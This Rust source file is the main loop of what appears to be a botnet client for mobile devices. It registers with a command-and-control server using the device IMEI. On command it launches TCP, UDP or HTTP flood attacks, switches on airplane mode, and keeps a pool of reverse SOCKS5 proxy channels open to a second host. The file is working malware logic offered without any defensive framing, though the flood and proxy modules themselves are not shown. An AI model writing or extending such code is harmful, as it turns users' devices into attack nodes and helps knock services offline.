mod ddos;
mod tcp;
mod resolv;
mod communication;
mod sys;
mod socks5;

use std::io::{Read, Write};
use std::net::{Ipv4Addr, TcpStream};
use std::{thread, time};
use std::str::FromStr;
use std::sync::{Arc, Mutex};
use serde::{Deserialize, Serialize};
use bson::raw::RawDocumentBuf;
use crate::communication::ddos_frequency::*;
use crate::communication::common_frequency::*;
use crate::ddos::flood::match_and_launch;
use crate::sys::system::*;
use crate::socks5::reverse_socks5;

static STABLE_SOCKS5_CHANNEL_SIZE: i32 = 16;
static CNC_ADDR: &str = "127.0.0.1";
static CNC_PORT: &str = "1337";
static REVERSE_SOCKS5_ADDR: &str = "127.0.0.1";
static REVERSE_SOCKS5_PORT: &str = "7777";


fn main() {

    let mut c2_connected = false;
    let mut c2_stream: Option<TcpStream> = None;

    thread::spawn({
        move || {
            let current_socks5_channel_size = Arc::new(Mutex::new(0));
            loop {
                if STABLE_SOCKS5_CHANNEL_SIZE > *current_socks5_channel_size.lock().unwrap() {
                    println!("{}", *current_socks5_channel_size.lock().unwrap());
                    let current_socks5_channel_size_clone= Arc::clone(&current_socks5_channel_size);
                    {
                        reverse_socks5::spawn_reverse_proxy_sock_channel(current_socks5_channel_size_clone);
                    }
                    *current_socks5_channel_size.lock().unwrap() += 1;
                }
                thread::sleep(time::Duration::from_micros(300)); // 없으며ㅑㄴ 배터리 족지랄남
            }
        }
    }); // maintain STABLE_SOCKS5_CHANNEL_SIZE

    loop {
        if !c2_connected {
            match TcpStream::connect(
                format!(
                    "{}:{}", CNC_ADDR, CNC_PORT
                )
            ) {
                Ok(s) => {
                    c2_connected = true;
                    c2_stream = Some(s);
                    if let Some(ref mut c2_stream) = c2_stream {

                        let message = Message {imei: get_device_imei(), shellcode: C2_INIT_SIG};
                        let mut payload: Vec<u8> = vec![];
                        bson::to_document(&message).unwrap().to_writer(&mut payload).unwrap();

                        c2_stream.write(&payload).unwrap();

                    }
                    continue;
                }
                Err(_) => continue
            };
        }
        else {
            let mut flood_launch_code: u32 = 0;
            loop {
                let mut buf: [u8; 1024] = [0; 1024];
                if let Some(ref mut c2_stream) = c2_stream {
                    match c2_stream.read(&mut buf) {
                        Ok(n) => {
                            if n == 0 { c2_connected = false; break }

                            if flood_launch_code != 0 {
                                match_and_launch(flood_launch_code, &buf, n); // start flood
                                flood_launch_code = 0; continue
                            }

                            let m: Message = bson::from_document(
                                RawDocumentBuf::from_bytes(buf[0..n].to_vec()).unwrap().to_document().unwrap()
                            ).unwrap();

                            if m.imei == get_device_imei() {
                                match m.shellcode {
                                    SET_AIR_SIG => set_airplane(),
                                    L4_TCP_SIG | L4_UDP_SIG | L7_HTTP_SIG => {
                                        flood_launch_code = m.shellcode.clone();
                                        let mut payload: Vec<u8> = vec![];
                                        bson::to_document(&Message {imei: get_device_imei(), shellcode: WAIT_OK_SIG})
                                            .unwrap().to_writer(&mut payload).unwrap();

                                        c2_stream.write(&payload).unwrap();
                                    },
                                    _ => ()
                                }
                            }
                        }
                        Err(_) => { c2_connected = false; break }
                    };
                }
            }

        }
    }
}
